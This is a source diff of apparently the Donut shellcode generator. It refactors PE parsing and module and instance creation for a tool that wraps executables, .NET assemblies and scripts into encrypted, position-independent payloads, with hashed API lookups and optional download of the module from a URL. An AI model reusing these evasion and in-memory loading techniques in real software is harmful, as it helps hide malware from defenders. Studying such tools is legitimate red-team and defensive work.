@@ -147,43 +147,6 @@ static GUID xIID_IXMLDOMNode = {
 #endif
 #endif
 
-uint64_t read_script(const char *path, void **data) {
-    uint64_t    len;
-    struct stat fs;
-    FILE        *in;
-    
-    // Script is inaccessibe? exit
-    if(stat(path, &fs) != 0) return 0;
-
-    // Zero file size? exit
-    if(fs.st_size == 0) return 0;
-
-    len = fs.st_size;
-    
-    // Open script for reading
-    in = fopen(path, "rb");
-    if(in == NULL) return 0;
-    
-    // allocate memory for writing
-    *data = calloc(len + 8, sizeof(char));
-    if(*data != NULL) {
-      fread(*data, sizeof(char), len, in);
-    } 
-    fclose(in);
-    return len;
-}
-
-// cheapo conversion from utf8 to utf16
-static uint64_t utf8_to_utf16(wchar_t* dst, const char* src, uint64_t len) {
-    uint16_t *out = (uint16_t*)dst;
-    uint64_t   i;
-    
-    for(i=0; src[i] != 0 && i < len; i++) {
-      out[i] = src[i];
-    }
-    return i;
-}
-
 // return pointer to DOS header
 PIMAGE_DOS_HEADER DosHdr(void *map) {
     return (PIMAGE_DOS_HEADER)map;
@@ -268,171 +231,227 @@ ULONG64 rva2ofs (void *base, DWORD rva) {
     }
     return -1;
 }
-int GetTypePE(const char *path) {
-    int                   fd, type = -1;
-    struct stat           fs;
-    PIMAGE_DATA_DIRECTORY dir;
-    PIMAGE_NT_HEADERS     nt;
-    DWORD                 dotnet=0;
-    uint8_t               *base;
+
+// map a file into memory for reading
+static int map_file(const char *path, file_info *fi) {
+    struct stat fs;
+
+    DPRINT("Reading size of file : %s", path);
+    if(stat(path, &fs) != 0) {
+      return DONUT_ERROR_FILE_NOT_FOUND;
+    }
     
+    if(fs.st_size == 0) {
+      return DONUT_ERROR_FILE_EMPTY;
+    }
+      
     DPRINT("Opening %s", path);
-    fd = open(path, O_RDONLY);
-    if(fd < 0) return 0;
+    fi->fd = open(path, O_RDONLY);
     
-    // get the size of file
-    if(fstat(fd, &fs) == 0) {
-      // map into memory
-      DPRINT("Mapping %i bytes for %s", fs.st_size, path);
-      base = (uint8_t*)mmap(NULL, fs.st_size,  
-        PROT_READ, MAP_PRIVATE, fd, 0);
-        
-      if(base != NULL) {
-        DPRINT("Checking DOS header");
-        if(valid_dos_hdr(base)) {
-          DPRINT("Checking NT header");
-          if(valid_nt_hdr(base)) {
-            DPRINT("Checking COM directory");
-            dir = Dirs(base);
-            if(dir != NULL) {
-              dotnet = (dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress != 0 &&
-                        dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size != 0);
-            }
-            nt = NtHdr(base);
-            
-            if(nt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
-              type = (dotnet) ? DONUT_MODULE_NET_DLL : DONUT_MODULE_DLL;
-            } else {
-              type = (dotnet) ? DONUT_MODULE_NET_EXE : DONUT_MODULE_EXE;
-            }
-          }
-        }
-        DPRINT("Unmapping");
-        munmap(base, fs.st_size);
-      }
+    if(fi->fd < 0) {
+      return DONUT_ERROR_FILE_ACCESS;
     }
-    DPRINT("Closing %s", path);
-    close(fd);
     
-    return type;
+    fi->size = fs.st_size;
+    
+    // map into memory
+    DPRINT("Mapping %" PRIi64 " bytes for %s", fi->size, path);
+    fi->map = mmap(NULL, fi->size,  
+      PROT_READ, MAP_PRIVATE, fi->fd, 0);
+    
+    // no mapping? close file
+    if(fi->map == NULL) {
+      close(fi->fd);
+      fi->map = NULL;
+      return DONUT_ERROR_NO_MEMORY;
+    }
+    return DONUT_ERROR_SUCCESS;
 }
 
-// need to check headers
-static int GetModuleType(const char *file) {
-    int  type = -1;
-    char *ext;
+// unmap a file from memory previously opened with map_file()
+int unmap_file(file_info *fi) {
     
-    DPRINT("Checking extension of %s", file);
-    ext = strrchr(file, '.') + 1;
-    DPRINT("Extension is \"%s\"", ext);
+    if(fi == NULL) return 0;
     
-    if((strcasecmp(ext, "exe") == 0) || 
-       (strcasecmp(ext, "dll") == 0)) 
-    {
-      DPRINT("Module is EXE or DLL");
-      type = GetTypePE(file);      
-    } else if (strcasecmp(ext, "vbs") == 0) {
-      DPRINT("Module is VBS");
-      type = DONUT_MODULE_VBS;
-    } else if (strcasecmp(ext,  "js") == 0) {
-      DPRINT("Module is JS");
-      type = DONUT_MODULE_JS;
-    } else if (strcasecmp(ext, "xsl") == 0) {
-      DPRINT("Module is XSL");
-      type = DONUT_MODULE_XSL;
-    }
-    return type;
+    DPRINT("Unmapping");
+    munmap(fi->map, fi->size);    
+    
+    DPRINT("Closing");
+    close(fi->fd);
+    
+    return 1;
 }
 
-void set_subsystem(void *map, uint16_t subsystem) {
-    PIMAGE_OPTIONAL_HEADER32 hdr32;
-    PIMAGE_OPTIONAL_HEADER64 hdr64;
-    #ifdef DEBUG
-    uint16_t                 ss;
-    #endif
-    
-    if(is32(map)) {
-      hdr32 = (PIMAGE_OPTIONAL_HEADER32)OptHdr(map);
-      #ifdef DEBUG
-      ss = hdr32->Subsystem;
-      #endif
-      hdr32->Subsystem = subsystem;
-    } else {
-      hdr64 = (PIMAGE_OPTIONAL_HEADER64)OptHdr(map);
-      #ifdef DEBUG
-      ss = hdr64->Subsystem;
-      #endif
-      hdr64->Subsystem = subsystem;
-    }
-    DPRINT("Subsystem before reset : %02x", ss);
-}
-
-// Per the ECMA spec, the section data looks like this:
-typedef struct tagMDSTORAGESIGNATURE {
-    ULONG       lSignature;             // "Magic" signature.
-    USHORT      iMajorVer;              // Major file version.
-    USHORT      iMinorVer;              // Minor file version.
-    ULONG       iExtraData;             // Offset to next structure of information 
-    ULONG       iVersionString;         // Length of version string
-    BYTE        pVersion[0];            // Version string
-} MDSTORAGESIGNATURE, *PMDSTORAGESIGNATURE;
-
-static char *GetVersionFromFile(const char *file) {
-    PIMAGE_COR20_HEADER   cor; 
+int get_file_info(const char *path, file_info *fi) {
+    PIMAGE_NT_HEADERS     nt;    
     PIMAGE_DATA_DIRECTORY dir;
-    DWORD                 rva;
-    int                   fd;
-    struct stat           fs;
-    uint8_t               *base;
     PMDSTORAGESIGNATURE   pss;
-    static char           version[32];
-    uint64_t              ofs;
+    PIMAGE_COR20_HEADER   cor;
+    DWORD                 dll, rva, ofs, cpu, i;
+    BOOL                  com = FALSE;
+    PCHAR                 ext;
+    int                   err = DONUT_ERROR_SUCCESS;
     
-    // default if no version can be retrieved
-    strcpy(version, "v4.0.30319");
+    DPRINT("Entering.");
     
-    DPRINT("Opening %s", file);
-    fd = open(file, O_RDONLY);
-    if(fd < 0) return version;
+    // invalid parameters passed?
+    if(path == NULL || fi == NULL) {
+      return DONUT_ERROR_INVALID_PARAMETER;
+    }
+    // zero initialize file_info structure
+    memset(fi, 0, sizeof(file_info));
     
-    // get the size of assembly
-    if(fstat(fd, &fs) == 0) {
-      // map into memory
-      DPRINT("Mapping %i bytes for %s", fs.st_size, file);
-      base = (uint8_t*)mmap(NULL, fs.st_size,  
-        PROT_READ, MAP_PRIVATE, fd, 0);
+    DPRINT("Checking extension of %s", path);
+    ext = strrchr(path, '.');
+    
+    // no extension? exit
+    if(ext == NULL) {
+      return DONUT_ERROR_FILE_INVALID;
+    }
+    DPRINT("Extension is \"%s\"", ext);
+
+    // VBScript?
+    if (strcasecmp(ext, ".vbs") == 0) {
+      DPRINT("Module is VBS");
+      fi->type = DONUT_MODULE_VBS;
+    } else 
+    // JScript?
+    if (strcasecmp(ext,  ".js") == 0) {
+      DPRINT("Module is JS");
+      fi->type = DONUT_MODULE_JS;
+    } else 
+    // XSL?
+    if (strcasecmp(ext, ".xsl") == 0) {
+      DPRINT("Module is XSL");
+      fi->type = DONUT_MODULE_XSL;
+    } else
+    // EXE?
+    if (strcasecmp(ext, ".exe") == 0) {
+      DPRINT("Module is EXE");
+      fi->type = DONUT_MODULE_EXE;
+    } else
+    // DLL?
+    if (strcasecmp(ext, ".dll") == 0) {
+      DPRINT("Module is DLL");
+      fi->type = DONUT_MODULE_DLL;
+    } else {
+      // unrecognized extension
+      return DONUT_ERROR_FILE_INVALID;
+    }
+    
+    DPRINT("Mapping %s into memory", path);
+    
+    err = map_file(path, fi);
+    if(err != DONUT_ERROR_SUCCESS) return err;
+    
+    // file is EXE or DLL?
+    if(fi->type == DONUT_MODULE_DLL ||
+       fi->type == DONUT_MODULE_EXE)
+    {
+      DPRINT("Checking DOS header");
+      
+      if(!valid_dos_hdr(fi->map)) {
+        err = DONUT_ERROR_FILE_INVALID;
+        goto cleanup;
+      }
+      DPRINT("Checking NT header");
+      
+      if(!valid_nt_hdr(fi->map)) { 
+        err = DONUT_ERROR_FILE_INVALID;
+        goto cleanup;
+      }
+      DPRINT("Checking IMAGE_DATA_DIRECTORY");
+      
+      dir = Dirs(fi->map);
+      
+      if(dir == NULL) {
+        err = DONUT_ERROR_FILE_INVALID;
+        goto cleanup;
+      }
+      DPRINT("Checking characteristics");
+      
+      nt  = NtHdr(fi->map);
+      dll = nt->FileHeader.Characteristics & IMAGE_FILE_DLL;
+      cpu = is32(fi->map);
+      rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
+      
+      // set the CPU architecture for file
+      fi->arch = cpu ? DONUT_ARCH_X86 : DONUT_ARCH_X64;
+      
+      // if COM directory present
+      if(rva != 0) {
+        DPRINT("COM Directory found");
         
-      if(base != NULL) {
-        DPRINT("Reading IMAGE_COR20_HEADER");
-        dir = Dirs(base);
-        rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
-        DPRINT("RVA : %08lx", rva);
+        // set type to EXE or DLL assembly
+        fi->type = (dll) ? DONUT_MODULE_NET_DLL : DONUT_MODULE_NET_EXE;
         
-        if(rva != 0) {
-          ofs = rva2ofs(base, rva);
-          if (ofs != -1) {
-            cor = (PIMAGE_COR20_HEADER)(ofs + base);
-            DPRINT("PIMAGE_COR20_HEADER : %p", cor);
-            rva = cor->MetaData.VirtualAddress;
-            DPRINT("RVA : %08lx", rva);
-            if(rva != 0) {
-              ofs = rva2ofs(base, rva);
-              DPRINT("RVA2OFS(rva=%08lx, ofs=%016llx)", rva, ofs);
-              if(ofs != -1) {
-                pss = (PMDSTORAGESIGNATURE)(ofs + base);
-                strncpy(version, (char*)pss->pVersion, sizeof(version) - 1);
-              }
+        // try read the runtime version from meta header
+        strncpy(fi->ver, "v4.0.30319", DONUT_VER_LEN - 1);
+        
+        ofs = rva2ofs(fi->map, rva);
+        if (ofs != -1) {
+          cor = (PIMAGE_COR20_HEADER)(ofs + fi->map);
+          rva = cor->MetaData.VirtualAddress;
+          if(rva != 0) {
+            ofs = rva2ofs(fi->map, rva);
+            if(ofs != -1) {
+              pss = (PMDSTORAGESIGNATURE)(ofs + fi->map);
+              DPRINT("Runtime version : %s", (char*)pss->pVersion);
+              strncpy(fi->ver, (char*)pss->pVersion, DONUT_VER_LEN - 1);
             }
           }
         }
-        munmap(base, fs.st_size);
       }
     }
-    DPRINT("Version : %s", version);
-    DPRINT("Closing %s", file);
-    close(fd);
+cleanup:
+    if(err != DONUT_ERROR_SUCCESS) {
+      unmap_file(fi);
+    }
+    DPRINT("Leaving.");
+    return err;
+}
+
+// check if DLL exports function name
+static int is_dll_export(file_info *fi, const char *function) {
+    PIMAGE_DATA_DIRECTORY   dir;
+    PIMAGE_EXPORT_DIRECTORY exp;
+    DWORD                   rva, ofs, cnt;
+    PDWORD                  sym;
+    PCHAR                   str;
+    int                     found = 0;
+
+    DPRINT("Entering.");
     
-    return version;
+    dir = Dirs(fi->map);
+    if(dir != NULL) {
+      rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+      DPRINT("EAT VA : %lx", rva);
+      if(rva != 0) {
+        ofs = rva2ofs(fi->map, rva);
+        if(ofs != -1) {
+          exp = (PIMAGE_EXPORT_DIRECTORY)(fi->map + ofs);
+          cnt = exp->NumberOfNames;
+          DPRINT("Number of exported functions : %lx", cnt);
+          
+          if(cnt != 0) {
+            sym = (PDWORD)(rva2ofs(fi->map, exp->AddressOfNames) + fi->map);
+            // scan array for symbol
+            do {
+              str = (PCHAR)(rva2ofs(fi->map, sym[cnt - 1]) + fi->map);
+              DPRINT("Checking %s", str);
+              // if match found, exit
+              if(strcmp(str, function) == 0) {
+                DPRINT("Found API");
+                found = 1;
+                break;
+              }
+            } while (--cnt);
+          }
+        }
+      }
+    }
+    DPRINT("Leaving.");
+    return found;
 }
 
 // returns 1 on success else <=0
@@ -454,8 +473,8 @@ static int CreateRandom(void *buf, uint64_t len) {
     return ok;
 #else
     int      fd;
-    uint64_t   r=0;
-    uint8_t *p=(uint8_t*)buf;
+    uint64_t r=0;
+    uint8_t  *p=(uint8_t*)buf;
     
     DPRINT("Opening /dev/urandom to acquire %li bytes", len);
     fd = open("/dev/urandom", O_RDONLY);
@@ -488,239 +507,207 @@ static int GenRandomString(void *output, uint64_t len) {
     for(i=0; i<len; i++) {
       str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];
     }
-    str[i]=0;
+    str[i] = 0;
     return 1;
 }
 
-static int CreateModule(PDONUT_CONFIG c) {
-    struct stat   fs;
-    FILE          *fd;
+// cheapo conversion from utf8 to utf16
+static uint64_t utf8_to_utf16(void* dst, const char* src) {
+    uint16_t *out = (uint16_t*)dst;
+    uint64_t   i;
+    
+    for(i=0; src[i] != 0; i++) {
+      out[i] = src[i];
+    }
+    return i;
+}
+
+static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     PDONUT_MODULE mod = NULL;
     uint64_t      len = 0;
-    char          *param, parambuf[DONUT_MAX_NAME*DONUT_MAX_PARAM];
+    char          *param, parambuf[DONUT_MAX_NAME*DONUT_MAX_PARAM+DONUT_MAX_PARAM];
     int           cnt, err=DONUT_ERROR_SUCCESS;
     
-    // File is not found? exit
-    DPRINT("stat(%s)", c->file);
-    if(stat(c->file, &fs) != 0) return DONUT_ERROR_FILE_NOT_FOUND;
-
-    // Zero file size? exit
-    if(fs.st_size == 0) return DONUT_ERROR_FILE_EMPTY;
-
-    // Open file for reading
-    DPRINT("Opening %s...", c->file);
-    fd = fopen(c->file, "rb");
-
-    // Not opened? exit
-    if(fd == NULL) return DONUT_ERROR_FILE_ACCESS;
-
-    // Allocate memory for module information and contents of file
-    len = sizeof(DONUT_MODULE) + fs.st_size;
-    DPRINT("Allocating %" PRIi64 " bytes of memory for DONUT_MODULE", len);
-    mod = calloc(len, sizeof(uint8_t));
-
-    // If memory allocated
-    if(mod != NULL) {
-      // Set the type
-      mod->type = c->mod_type;
-      
-      // If a .NET assembly
-      if(c->mod_type == DONUT_MODULE_NET_DLL ||
-         c->mod_type == DONUT_MODULE_NET_EXE)
-      {
-        // If no domain name specified, generate a random string for it
-        if(c->domain[0] == 0) {
-          if(!GenRandomString(c->domain, 8)) {
-            return DONUT_ERROR_RANDOM;
-          }
-        }
-        // convert to unicode format..not a real conversion
-        DPRINT("Domain  : %s", c->domain);
-        utf8_to_utf16((wchar_t*)mod->domain,  c->domain, strlen(c->domain));
-        
-        // If assembly is DLL, we expect a class and method from user
-        if(mod->type == DONUT_MODULE_NET_DLL) {
-          DPRINT("Class   : %s", c->cls);
-          utf8_to_utf16((wchar_t*)mod->cls,     c->cls,    strlen(c->cls));
-        
-          DPRINT("Method  : %s", c->method);
-          utf8_to_utf16((wchar_t*)mod->method,  c->method, strlen(c->method));
-        }
-        // If no runtime specified, use from meta header or default
-        if(c->runtime[0] == 0) {
-          strncpy(c->runtime, GetVersionFromFile(c->file), DONUT_MAX_NAME - 1);
-        }
-        DPRINT("Runtime : %s", c->runtime);
-        utf8_to_utf16((wchar_t*)mod->runtime, c->runtime, strlen(c->runtime));
-      } else
-      // unmanaged DLL? check for exported api          
-      if(mod->type == DONUT_MODULE_DLL) {
-        if(c->method != NULL) {
-          DPRINT("Exported API : %s", c->method);
-          strncpy((char*)mod->method, c->method, strlen(c->method));
-        }
-      }
-      
-      // if parameters specified
-      if(c->param != NULL) {
-        strncpy(parambuf, c->param, sizeof(parambuf)-1);
-        cnt = 0;
-        // split by comma or semi-colon
-        param = strtok(parambuf, ",;");
-        
-        while(param != NULL && cnt < DONUT_MAX_PARAM) {
-          if(strlen(param) >= DONUT_MAX_NAME) {
-            DPRINT("Parameter(%s) exceeds DONUT_MAX_PARAM(%i)", 
-              param, DONUT_MAX_NAME);
-            err = DONUT_ERROR_INVALID_PARAMETER;
-            break;
-          }
-          DPRINT("Adding \"%s\"", param);
-          // convert ansi string to wide character string
-          utf8_to_utf16((wchar_t*)mod->param[cnt++], param, strlen(param));
-
-          // get next parameter
-          param = strtok(NULL, ",;");
-        }
-        // set number of parameters
-        mod->param_cnt = cnt;
-      }
-        
-      if(err == DONUT_ERROR_SUCCESS) {
-        // set length of module data
-        mod->len = fs.st_size;
-        // read module into memory
-        fread(&mod->data, 1, fs.st_size, fd);
-        // update configuration with pointer to module
-        c->mod     = mod;
-        c->mod_len = len;
-      }
-    } else err = DONUT_ERROR_NO_MEMORY;
-    // close file
-    fclose(fd);
+    DPRINT("Entering.");
     
+    // Allocate memory for module information and contents of file
+    len = sizeof(DONUT_MODULE) + fi->size;
+    DPRINT("Allocating %" PRIi64 " bytes of memory for DONUT_MODULE", len);
+    mod = calloc(len, 1);
+
+    // Memory not allocated? exit
+    if(mod == NULL) {
+      return DONUT_ERROR_NO_MEMORY;
+    }
+    
+    // Set the type of module
+    mod->type = fi->type;
+      
+    // DotNet assembly?
+    if(mod->type == DONUT_MODULE_NET_DLL ||
+       mod->type == DONUT_MODULE_NET_EXE)
+    {
+      // If no domain name specified, generate a random one
+      if(c->domain[0] == 0) {
+        if(!GenRandomString(c->domain, DONUT_DOMAIN_LEN)) {
+          err = DONUT_ERROR_RANDOM;
+          goto cleanup;
+        }
+      }
+      // convert to unicode format.
+      // wchar_t is 32-bits on linux, but 16-bit on windows. :-|
+      DPRINT("Domain  : %s", c->domain);
+      utf8_to_utf16(mod->domain, c->domain);
+      
+      // Assembly is DLL? Copy the class and method
+      if(mod->type == DONUT_MODULE_NET_DLL) {
+        DPRINT("Class   : %s", c->cls);
+        utf8_to_utf16(mod->cls, c->cls);
+        
+        DPRINT("Method  : %s", c->method);
+        utf8_to_utf16(mod->method, c->method);
+      }
+      // If no runtime specified in configuration, use version from assembly
+      if(c->runtime[0] == 0) {
+        strncpy(c->runtime, fi->ver, DONUT_MAX_NAME-1);
+      }
+      DPRINT("Runtime : %s", c->runtime);
+      utf8_to_utf16(mod->runtime, c->runtime);
+    } else
+    // Unmanaged DLL? check for exported api          
+    if(mod->type == DONUT_MODULE_DLL && 
+       c->method[0] != 0) 
+    {
+      DPRINT("DLL function : %s", c->method);
+      strncpy((char*)mod->method, c->method, DONUT_MAX_NAME-1);
+    }
+      
+    // Parameters specified?
+    if(c->param[0] != 0) {
+      strncpy(parambuf, c->param, sizeof(parambuf)-1);
+      cnt = 0;
+      // Split by comma or semi-colon
+      param = strtok(parambuf, ",;");
+      
+      while(param != NULL && cnt < DONUT_MAX_PARAM) {
+        if(strlen(param) >= DONUT_MAX_NAME) {
+          DPRINT("Parameter : \"%s\" exceeds DONUT_MAX_PARAM(%i)", 
+            param, DONUT_MAX_NAME);
+          err = DONUT_ERROR_INVALID_PARAMETER;
+          goto cleanup;
+        }
+        DPRINT("Adding \"%s\"", param);
+        // convert ansi string to wide character string
+        utf8_to_utf16(mod->param[cnt++], param);
+
+        // get next parameter
+        param = strtok(NULL, ",;");
+      }
+      // set number of parameters
+      mod->param_cnt = cnt;
+    }
+    
+    // set length of module data
+    mod->len = fi->size;
+    // read module into memory
+    memcpy(&mod->data, fi->map, fi->size);
+    // update configuration with pointer to module
+    c->mod     = mod;
+    c->mod_len = len;
+    
+cleanup:
     // if there was an error, free memory for module
     if(err != DONUT_ERROR_SUCCESS && mod != NULL) {
       free(mod);
-      c->mod = NULL;
+      c->mod     = NULL;
       c->mod_len = 0;
     }
+    DPRINT("Leaving.");
     return err;
 }
 
-static int CreateInstance(PDONUT_CONFIG c) {
+static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     DONUT_CRYPT     inst_key, mod_key;
-    PDONUT_INSTANCE inst = NULL;
-    uint64_t        url_len, inst_len = 0;
-    uint64_t        dll_hash=0, iv=0;
-    int             cnt, slash=0;
-    char            sig[DONUT_MAX_NAME];
+    PDONUT_INSTANCE inst;
+    uint64_t        inst_len;
+    uint64_t        dll_hash;
+    int             cnt;
     
-    // no configuration or module? exit
-    DPRINT("Checking configuration");
+    DPRINT("Entering.");
     
-    if(c == NULL || c->mod == NULL) {
-      return DONUT_ERROR_INVALID_PARAMETER;
-    }
-    // if this is URL instance
-    if(c->inst_type == DONUT_INSTANCE_URL) {
-      // ensure URL parameter and module name don't exceed DONUT_MAX_URL
-      url_len = strlen(c->url);
-      
-      if((url_len + DONUT_MAX_MODNAME + 1) >= DONUT_MAX_URL) {
-        return DONUT_ERROR_URL_LENGTH;
-      }
-      
-      // if the end of string doesn't have a forward slash
-      // add one more to account for it
-      if(c->url[url_len - 1] != '/') slash++;
-    }
-    DPRINT("Generating random IV for Maru hash");
-    
-    if(!CreateRandom(&iv, MARU_IV_LEN)) {
-      return DONUT_ERROR_RANDOM;
-    }
-#if !defined(NOCRYPTO)
-    DPRINT("Generating random key for encrypting instance");
-    
-    if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
-      return DONUT_ERROR_RANDOM;
-    }
-    DPRINT("Generating random key and signature for encrypting module");
-    
-    if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
-      return DONUT_ERROR_RANDOM;
-    }
-    if(!GenRandomString(sig, 8)) {
-      return DONUT_ERROR_RANDOM;
-    }
-    DPRINT("Generated random string for signature : %s", sig);
-#endif
-    // if this is a URL instance, generate a random name for module
-    // that will be saved to disk
-    if(c->inst_type == DONUT_INSTANCE_URL) {
-      if(!GenRandomString(c->modname, DONUT_MAX_MODNAME)) {
-        return DONUT_ERROR_RANDOM;
-      }
-      DPRINT("Generated random name for module : %s", c->modname);
-    }
-    // calculate the size of instance based on the type
+    // Allocate memory for the size of instance based on the type
     DPRINT("Allocating space for instance");
-    
     inst_len = sizeof(DONUT_INSTANCE);
     
     // if this is a PIC instance, add the size of module
-    // which will be appended to the end of structure
+    // that will be appended to the end of structure
     if(c->inst_type == DONUT_INSTANCE_PIC) {
       DPRINT("The size of module is %" PRIi64 " bytes. " 
              "Adding to size of instance.", c->mod_len);
       inst_len += c->mod_len;
     }
-    // allocate memory
+    // allocate zero-initialized memory for instance
     inst = (PDONUT_INSTANCE)calloc(inst_len, 1);
     
-    // if we failed? return
-    if(inst == NULL) return DONUT_ERROR_NO_MEMORY;
+    // Memory allocation failed? exit
+    if(inst == NULL) {
+      return DONUT_ERROR_NO_MEMORY;
+    }
     
 #if !defined(NOCRYPTO)
-    DPRINT("Setting the decryption key for instance");
+    DPRINT("Generating random key for instance");
+    if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
+      return DONUT_ERROR_RANDOM;
+    }
     memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));
     
-    DPRINT("Setting the decryption key for module");
+    DPRINT("Generating random key for module");
+    if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
+      return DONUT_ERROR_RANDOM;
+    }
     memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));
+    
+    DPRINT("Generating random string to verify decryption");
+    if(!GenRandomString(inst->sig, DONUT_SIG_LEN)) {
+      return DONUT_ERROR_RANDOM;
+    }
 #endif
    
-    DPRINT("Generating hashes for API using IV: %" PRIx64, iv);
-    inst->iv = iv;
+    DPRINT("Generating random IV for Maru hash");
+    if(!CreateRandom(&inst->iv, MARU_IV_LEN)) {
+      return DONUT_ERROR_RANDOM;
+    }
+    
+    DPRINT("Generating hashes for API using IV: %" PRIx64, inst->iv);
     
     for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
       // calculate hash for DLL string
-      dll_hash = maru(api_imports[cnt].module, iv);
+      dll_hash = maru(api_imports[cnt].module, inst->iv);
       
       // calculate hash for API string.
       // xor with DLL hash and store in instance
-      inst->api.hash[cnt] = maru(api_imports[cnt].name, iv) ^ dll_hash;
+      inst->api.hash[cnt] = maru(api_imports[cnt].name, inst->iv) ^ dll_hash;
       
       DPRINT("Hash for %-15s : %-22s = %" PRIX64, 
         api_imports[cnt].module, 
         api_imports[cnt].name,
         inst->api.hash[cnt]);
     }
-    // set how many addresses to resolve
+    // save how many API to resolve
     inst->api_cnt = cnt;
     inst->dll_cnt = 0;
 
     strcpy(inst->dll_name[inst->dll_cnt++], "ole32.dll");
     strcpy(inst->dll_name[inst->dll_cnt++], "oleaut32.dll");
-    strcpy(inst->dll_name[inst->dll_cnt++], "wininet.dll");
+    strcpy(inst->dll_name[inst->dll_cnt++], "wininet.dll");  
     strcpy(inst->dll_name[inst->dll_cnt++], "mscoree.dll");
-    
-    // if this module is .NET assembly
+        
+    // if module is .NET assembly
     if(c->mod_type == DONUT_MODULE_NET_DLL ||
        c->mod_type == DONUT_MODULE_NET_EXE)
     {
       DPRINT("Copying GUID structures and DLL strings for loading .NET assemblies");
-      
+
       memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
       memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));
       memcpy(&inst->xCLSID_CLRMetaHost,    &xCLSID_CLRMetaHost,    sizeof(GUID));
@@ -728,6 +715,7 @@ static int CreateInstance(PDONUT_CONFIG c) {
       memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
       memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));
     } else 
+    // if module is VBS or JS
     if(c->mod_type == DONUT_MODULE_VBS ||
        c->mod_type == DONUT_MODULE_JS)
     {       
@@ -741,8 +729,8 @@ static int CreateInstance(PDONUT_CONFIG c) {
       memcpy(&inst->xIID_IActiveScriptParse32,  &xIID_IActiveScriptParse32,  sizeof(GUID));
       memcpy(&inst->xIID_IActiveScriptParse64,  &xIID_IActiveScriptParse64,  sizeof(GUID));
       
-      utf8_to_utf16((wchar_t*)inst->wscript,     "WScript",     -1);
-      utf8_to_utf16((wchar_t*)inst->wscript_exe, "wscript.exe", -1);
+      utf8_to_utf16(inst->wscript,     "WScript");
+      utf8_to_utf16(inst->wscript_exe, "wscript.exe");
       
       if(c->mod_type == DONUT_MODULE_VBS) {
         memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_VBScript, sizeof(GUID));
@@ -750,6 +738,7 @@ static int CreateInstance(PDONUT_CONFIG c) {
         memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_JScript,  sizeof(GUID));
       }
     } else
+    // if module is XSL
     if(c->mod_type == DONUT_MODULE_XSL)
     {
       DPRINT("Copying GUID structures for loading XSL to instance");
@@ -777,26 +766,27 @@ static int CreateInstance(PDONUT_CONFIG c) {
     // if the module will be downloaded
     // set the URL parameter and request verb
     if(inst->type == DONUT_INSTANCE_URL) {
+      // generate a random name for module
+      // that will be saved to disk
+      if(!GenRandomString(c->modname, DONUT_MAX_MODNAME)) {
+        return DONUT_ERROR_RANDOM;
+      }
+      DPRINT("Generated random name for module : %s", c->modname);
+    
       DPRINT("Setting URL parameters");
-      
       strcpy(inst->http.url, c->url);
-      if(slash) strcat(inst->http.url, "/");
-      if(slash) strcat(c->url, "/");
       // append module name
       strcat(inst->http.url, c->modname);
       // set the request verb
       strcpy(inst->http.req, "GET");
       
-      DPRINT("Payload will attempt download from : %s", 
-        inst->http.url);
+      DPRINT("Payload will attempt download from : %s", inst->http.url);
     }
 
     inst->mod_len = c->mod_len;
     inst->len     = inst_len;
     c->inst       = inst;
     c->inst_len   = inst_len;
-    
-    strcpy((char*)inst->sig, sig);
     
 #if !defined(NOCRYPTO)
     if(c->inst_type == DONUT_INSTANCE_URL) {
@@ -830,17 +820,23 @@ static int CreateInstance(PDONUT_CONFIG c) {
       inst_data, 
       c->inst_len - offsetof(DONUT_INSTANCE, api_cnt));
 #endif
+    DPRINT("Leaving.");
+    
     return DONUT_ERROR_SUCCESS;
 }
   
 // given a configuration, create a PIC that will run from anywhere in memory
-EXPORT_FUNC int DonutCreate(PDONUT_CONFIG c) {
-    uint8_t  *pl;
-    uint32_t t;
-    int      err = DONUT_ERROR_SUCCESS;
-    FILE     *fd;
+EXPORT_FUNC 
+int DonutCreate(PDONUT_CONFIG c) {
+    uint8_t   *pl;
+    uint32_t  t;
+    int       url_len, err = DONUT_ERROR_SUCCESS;
+    FILE      *fd;
+    file_info fi;
     
-    DPRINT("Validating configuration and path of assembly");
+    DPRINT("Entering.");
+    
+    DPRINT("Validating configuration and path of file");
     
     if(c == NULL || c->file == NULL) {
       return DONUT_ERROR_INVALID_PARAMETER;
@@ -855,27 +851,9 @@ EXPORT_FUNC int DonutCreate(PDONUT_CONFIG c) {
     c->pic      = NULL;
     c->pic_len  = 0;
     
-    // get the module type
-    DPRINT("Getting type of module");
-    c->mod_type = GetModuleType(c->file);
-    if(c->mod_type < 0) return DONUT_ERROR_FILE_INVALID;
-    
-    // if this is a .NET DLL or EXE files, check if it's a valid assembly
-    if(c->mod_type == DONUT_MODULE_NET_DLL ||
-       c->mod_type == DONUT_MODULE_NET_EXE)
-    {
-      // get runtime version if none provided
-      if(c->runtime[0] == 0) {
-        GetVersionFromFile(c->file);
-      }
-      if(c->mod_type == DONUT_MODULE_NET_DLL) {
-        DPRINT("Validating class and method for DLL");
-        if(c->cls[0] == 0 || c->method[0] == 0) {
-          return DONUT_ERROR_FILE_PARAMS;
-        }
-      }
-    }
+    // instance not specified?
     DPRINT("Validating instance type");
+    
